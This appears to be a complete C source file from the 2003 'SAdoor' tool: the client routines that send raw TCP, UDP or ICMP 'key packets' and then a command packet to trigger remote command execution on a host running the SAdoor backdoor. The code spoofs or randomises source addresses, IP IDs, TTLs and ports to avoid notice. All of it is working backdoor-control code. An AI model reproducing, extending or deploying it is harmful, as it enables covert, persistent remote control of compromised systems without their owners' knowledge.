/*
 *  File: command.c
 *  Author: Claes M. Nyberg <md0claes@mdstud.chalmers.se>
 *  Description: SAdoor client sadoor-packet routines
 *  Version: 1.0
 *  Date: Mon Mar 17 20:11:03 CET 2003
 *
 *  Copyright (c) 2003 Claes M. Nyberg <md0claes@mdstud.chalmers.se>
 *  All rights reserved, all wrongs reversed.
 *
 *  Redistribution and use in source and binary forms, with or without
 *  modification, are permitted provided that the following conditions
 *  are met:
 *
 *  1. Redistributions of source code must retain the above copyright
 *     notice, this list of conditions and the following disclaimer.
 *  2. Redistributions in binary form must reproduce the above copyright
 *     notice, this list of conditions and the following disclaimer in the
 *     documentation and/or other materials provided with the distribution.
 *  3. The name of author may not be used to endorse or promote products
 *     derived from this software without specific prior written permission.
 *
 *  THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES,
 *  INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY
 *  AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL
 *  THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 *  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
 *  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS;
 *  OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
 *  WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR
 *  OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF
 *  ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */   

#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include "net.h"
#include "random.h"
#include "command.h"
#include "iraw.h"
#include "sash.h"

/* Global options */
extern struct sashopt opt;

/*
 * Send key packets and command to target SAdoor
 * The payload of the command packet is appended with cmd.
 * Returns -1 on error and zero on success.
 */
int
sadoor_command(int raw_sock, struct sadbent *sae, u_char *cmd, size_t dlen, time_t delay)
{
	u_char *saved_pt = NULL; /* Saved command packet payload */
	u_int saved_len = 0;
	u_char **cpkt_data;
	u_short *cpkt_dlen;
	struct sa_pkt *pkt;
	u_char *pt;
	size_t pcount = 0;
	int ret = 0;

	if (sae == NULL) {
		fprintf(stderr, "** Error: sadoor_command() Received NULL "
			"pointer as SADB entry\n");
		return(-1);
	}

	if (opt.sa_verbose > 0) {
		printf("Sending packets for %s",
			net_ntoa(opt.sa_tip, NULL));
	
		if (opt.sa_resolve == 1) {
			if ( (pt = net_hostname2(opt.sa_tip)) != NULL)
			printf(" (%s)", pt);
		}
		printf("\n");
	}
	
	pkt = sae->se_kpkts;
	
	/* Send all key packets */
	while (pkt != NULL) {
		pcount++;

		if (opt.sa_verbose > 1) 
			printf("Sending key packet %u%s", pcount, 
				opt.sa_verbose == 1 ? "\n" : ": ");
		
		if (send_sapkt(raw_sock, pkt) < 0) {
			close(raw_sock);
			return(-1);
		}

		/* Wait the requested amount of ms 
		 * (Some implementations of usleep()  does not allow
		 * the time to be more than a second) */
		if (sleep( (1000*delay)/1000000) < 0)
			perror("sleep()");
		
		if (usleep((1000*delay) % 1000000) <0)
			perror("usleep()");

		pkt = pkt->sa_kpkt_next;
	}

	/* Get pointers to data and data length */
	pkt = sae->se_cpkt;
	switch (pkt->sa_pkt_proto) {
	
		case SAPKT_PROTO_TCP:
			cpkt_data = &(((struct sa_tcph *)(pkt->sa_pkt_ph))->sa_tcph_data);
			cpkt_dlen = &(((struct sa_tcph *)(pkt->sa_pkt_ph))->sa_tcph_dlen);
			break;

		case SAPKT_PROTO_UDP:
			cpkt_data = &(((struct sa_udph *)(pkt->sa_pkt_ph))->sa_udph_data);
			cpkt_dlen = &(((struct sa_udph *)(pkt->sa_pkt_ph))->sa_udph_dlen);
			break;

		case SAPKT_PROTO_ICMP:
			cpkt_data = &(((struct sa_icmph *)(pkt->sa_pkt_ph))->sa_icmph_data);
			cpkt_dlen = &(((struct sa_icmph *)(pkt->sa_pkt_ph))->sa_icmph_dlen);
			break;
			
		default:
			fprintf(stderr, "** Error: Unrecognized protocol (0x%x) "
				"in command packet\n", pkt->sa_pkt_proto);
			close(raw_sock);
			return(-1);
			break;
	}

	/* Save pointer for later replacement */
	saved_pt = *cpkt_data;
	saved_len = *cpkt_dlen;

	/* Replace data in payload with command */
	if (*cpkt_dlen == 0) {
		*cpkt_data = (void *)cmd;
		*cpkt_dlen = dlen;
	}
	/* Append data to payload */
	else {
		u_char *tmp;

		if ( (tmp = (u_char *)calloc(*cpkt_dlen + dlen, 
				sizeof(u_char))) == NULL) {
			close(raw_sock);
			return(-1);
		}

		memcpy(tmp, *cpkt_data, *cpkt_dlen);
		memcpy(tmp + *cpkt_dlen, cmd, dlen);

		*cpkt_data = tmp;
		*cpkt_dlen += dlen;
	}

 	/* Tell parent to accept connection */
	if (getpid() != opt.sa_pid) {
		if (kill(getppid(), SIGUSR1) < 0) {
			fprintf(stderr, "** Error: could not send parent the "
				"\"go\" signal: kill(): %s\n", strerror(errno));
			return(-1);
		}
		usleep(100); /* FIXME: Ugly wait .. */
	}
 
 	if (opt.sa_verbose > 1)
		printf("Sending command packet%s", 
			opt.sa_verbose >= 2 ? ": " : "\n");

	ret = send_sapkt(raw_sock, pkt);
	fflush(stdout);
	
	if (saved_len != 0)
		free(*cpkt_data);

	*cpkt_data = saved_pt;
	*cpkt_dlen = saved_len;

	close(raw_sock);
	return(ret);
}


/*
 * Send the key packet pointed to by pkt.
 * Returns -1 on error and zero on success.
 */
int
send_sapkt(int raw_sock, struct sa_pkt *pkt)
{
	u_char packet[PACKET_MAX_SIZE];
	memset(packet, 0x00, sizeof(packet));

	if (pkt == NULL) {
		fprintf(stderr, "** Error: send_keypkt(): "
			"Received NULL pointer as sa_pkt\n");
		return(-1);
	}

	/* Set default values on unset fields */
	if (FIELD_IS_SET(pkt->sa_iph_fields, IPH_DADDR) == 0) {
		fprintf(stderr, "** Error: No destination address set\n");
		return(-1);
	}

	if (FIELD_IS_SET(pkt->sa_iph_fields, IPH_SADDR) == 0) {
		if (opt.sa_randflags & RANDON_SRCIPV4)
			pkt->sa_iph_saddr = random_ip();
		else
			pkt->sa_iph_saddr = opt.sa_saddr;
	}

	if (FIELD_IS_SET(pkt->sa_iph_fields, IPH_TOS) == 0) 
		pkt->sa_iph_tos = opt.sa_iptos;
	
	if (FIELD_IS_SET(pkt->sa_iph_fields, IPH_ID) == 0) {
		if (opt.sa_randflags & RANOM_IPID)
			random_bytes_weak((u_char *)&pkt->sa_iph_id, 
				sizeof(pkt->sa_iph_id));
		else
			pkt->sa_iph_id = opt.sa_ipid;
	}

	if (FIELD_IS_SET(pkt->sa_iph_fields, IPH_TTL) == 0) {
		if (opt.sa_randflags & RANDOM_IPTTL)
			pkt->sa_iph_ttl = random_int(30, 255);
		else
			pkt->sa_iph_ttl = opt.sa_ipttl;
	}
	else {

		if ((u_char)(pkt->sa_iph_ttl + opt.sa_addttl) < pkt->sa_iph_ttl) {
			fprintf(stderr, "** Error: TTL overflow (%u + %u = %u)\n",
				pkt->sa_iph_ttl, opt.sa_addttl, (u_char)(pkt->sa_iph_ttl + opt.sa_addttl));
			return(-1);
		}
		pkt->sa_iph_ttl += opt.sa_addttl;

		if (opt.sa_addttlset == 0) {
			fprintf(stderr, "*-*-*-*-*-*-*-*-*-* WARNING *-*-*-*-*-*-*-*-*-*-*\n");
			fprintf(stderr, "*  PACKET MIGHT BE UNMARKED BY TARGET SADOOR!   *\n");
			fprintf(stderr, "*  TTL value of %-3u set, but no value to add.   *\n", pkt->sa_iph_ttl); 
			fprintf(stderr, "*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*\n");
		}
	}

	/* Set IP header */
	if (iraw_add_ipv4(packet, pkt->sa_iph_tos, pkt->sa_iph_id, 
			pkt->sa_iph_ttl, pkt->sa_iph_saddr, pkt->sa_iph_daddr) == -1)
		return(-1);

	/* Add TCP */
	if (pkt->sa_pkt_proto == SAPKT_PROTO_TCP) {
		struct sa_tcph *tph = (struct sa_tcph *)pkt->sa_pkt_ph;


		if (FIELD_IS_SET(tph->sa_tcph_fields, TCPH_DPORT) == 0) {
			if (opt.sa_randflags & RANDOM_TCP_DSTPORT)
				random_bytes_weak((u_char *)&tph->sa_tcph_dport,
					sizeof(tph->sa_tcph_dport));
			else
				tph->sa_tcph_dport = opt.sa_tcpdport;
		}

		if (FIELD_IS_SET(tph->sa_tcph_fields, TCPH_SPORT) == 0) {
			if (opt.sa_randflags & RANDOM_TCP_SRCPORT)
				random_bytes_weak((u_char *)&tph->sa_tcph_sport, 
					sizeof(tph->sa_tcph_sport));
			else
				tph->sa_tcph_sport = opt.sa_tcpsport;
		}
	
		if (FIELD_IS_SET(tph->sa_tcph_fields, TCPH_ACK) == 0) {
			if (opt.sa_randflags & RANDOM_TCPACK)
				random_bytes_weak((u_char *)&tph->sa_tcph_ack,
					sizeof(tph->sa_tcph_ack));
			else
				tph->sa_tcph_ack = opt.sa_tcpack;
		}

		if (FIELD_IS_SET(tph->sa_tcph_fields, TCPH_SEQ) == 0) {
			if (opt.sa_randflags & RANDOM_TCPSEQ)
				random_bytes_weak((u_char *)&tph->sa_tcph_seq, 
					sizeof(tph->sa_tcph_seq));
			else
				tph->sa_tcph_seq = opt.sa_tcpseq;
		}

		if (FIELD_IS_SET(tph->sa_tcph_fields, TCPH_FLAGS) == 0) 
				tph->sa_tcph_flags = opt.sa_tcpflags;

		if (iraw_add_tcp(packet, tph->sa_tcph_sport, tph->sa_tcph_dport,
				tph->sa_tcph_seq, tph->sa_tcph_ack, tph->sa_tcph_flags,
				tph->sa_tcph_data, tph->sa_tcph_dlen) == -1)
			return(-1);
	}
	/* Set UDP */
	else if (pkt->sa_pkt_proto == SAPKT_PROTO_UDP) {
		struct sa_udph *udph = (struct sa_udph *)pkt->sa_pkt_ph;
		
		if (FIELD_IS_SET(udph->sa_udph_fields, UDPH_DPORT) == 0) {
			if (opt.sa_randflags & RANDOM_UDP_DSTPORT)
				random_bytes_weak((u_char *)&udph->sa_udph_dport,
					sizeof(udph->sa_udph_dport));
			else
				udph->sa_udph_dport = opt.sa_udpdport;
		}

		if (FIELD_IS_SET(udph->sa_udph_fields, UDPH_SPORT) == 0) {
			if (opt.sa_randflags & RANDOM_UDP_SRCPORT)
				random_bytes_weak((u_char *)&udph->sa_udph_sport,
					sizeof(udph->sa_udph_sport));
			else
				udph->sa_udph_sport = opt.sa_udpsport;
		}

		if (iraw_add_udp(packet, udph->sa_udph_sport, udph->sa_udph_dport,
				udph->sa_udph_data, udph->sa_udph_dlen) == -1)
			return(-1);
	}
	/* Set ICMP */
	else if (pkt->sa_pkt_proto == SAPKT_PROTO_ICMP) {
		struct sa_icmph *ich = (struct sa_icmph *)pkt->sa_pkt_ph;
		
		if ( ((ich->sa_icmph_type != 0) 
				&& (ich->sa_icmph_type != 8)) || (ich->sa_icmph_code != 0)) {
			fprintf(stderr, "** Error: Unsupported ICMP type-code (%d, %d) combination\n",
				ich->sa_icmph_type, ich->sa_icmph_code);
			return(-1);
		}
	
		if (FIELD_IS_SET(ich->sa_icmph_fields, ICMPH_CODE) == 0)
			ich->sa_icmph_code = 0;
	
		if (FIELD_IS_SET(ich->sa_icmph_fields, ICMPH_ID) == 0) {
			if (opt.sa_randflags & RANDOM_ICMP_ID)
				random_bytes_weak((u_char *)&ich->sa_icmph_id,
					sizeof(ich->sa_icmph_id));
			else
				ich->sa_icmph_id = opt.sa_icmpid;
		}

		if (FIELD_IS_SET(ich->sa_icmph_fields, ICMPH_SEQ) == 0) {
			if (opt.sa_randflags & RANDOM_ICMP_SEQ)
				random_bytes_weak((u_char *)&ich->sa_icmph_seq,
					sizeof(ich->sa_icmph_seq));
				else
					ich->sa_icmph_seq = opt.sa_icmpseq;
		}

		if(iraw_add_icmp(packet, ich->sa_icmph_type, ich->sa_icmph_code, 
				ich->sa_icmph_id, ich->sa_icmph_seq, 
				ich->sa_icmph_data, ich->sa_icmph_dlen) == -1)
			return(-1);
	}
	
	else {
		fprintf(stderr, "** Error: Unsupported protocol (0x%02x) in packet\n", 
			pkt->sa_pkt_proto);
		return(-1);
	}

	if (iraw_send_packet(raw_sock, packet) < 0)
		return(-1);
	return(0);
}
